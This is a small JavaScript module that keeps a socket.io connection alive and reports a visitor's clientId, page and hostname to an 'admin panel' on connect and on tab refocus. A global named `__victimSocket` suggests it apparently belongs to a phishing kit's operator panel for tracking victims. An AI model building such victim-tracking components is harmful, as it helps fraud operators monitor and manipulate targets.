/**
 * Keep admin panel routing in sync after mobile background / socket reconnect.
 * Emits clientId + socketId on connect and whenever the tab becomes visible again.
 */
(function (global) {
  function clientIdFromStorage() {
    return localStorage.getItem('clientId') || '';
  }

  function persistSocketSession(socketId, clientId) {
    try {
      localStorage.setItem(
        'socketSession',
        JSON.stringify({ socketId: socketId, clientId: clientId, timestamp: Date.now() })
      );
    } catch (e) {}
  }

  function announce(socket, page, reconnected) {
    var clientId = clientIdFromStorage();
    if (!clientId || !socket || !socket.connected) return;

    var payload = {
      clientId: clientId,
      page: page,
      socketId: socket.id,
      domain: global.location && global.location.hostname ? global.location.hostname : '',
    };
    if (reconnected) payload.reconnected = true;

    socket.emit('userConnectedToPage', payload);
    socket.emit('update-client-socket', payload);
    persistSocketSession(socket.id, clientId);
  }

  /**
   * @param {object} socket - socket.io client
   * @param {object} options - { page: string, onReconnect?: function }
   */
  function install(socket, options) {
    options = options || {};
    var page = options.page || 'unknown';
    var firstConnect = true;

    global.__victimSocket = socket;
    if (!global.socket) global.socket = socket;

    socket.on('connect', function () {
      var reconnected = !firstConnect;
      firstConnect = false;
      announce(socket, page, reconnected);
      if (reconnected && typeof options.onReconnect === 'function') {
        options.onReconnect();
      }
    });

    function refreshPresence() {
      if (document.visibilityState && document.visibilityState !== 'visible') return;
      if (socket.connected) {
        announce(socket, page, true);
      } else if (typeof socket.connect === 'function') {
        socket.connect();
      }
    }

    document.addEventListener('visibilitychange', refreshPresence);
    window.addEventListener('pageshow', refreshPresence);
    window.addEventListener('online', refreshPresence);

    socket.on('disconnect', function (reason) {
      if (reason === 'io server disconnect') {
        socket.connect();
      }
    });
  }

  global.SocketPresence = {
    install: install,
    announce: announce,
  };
})(window);
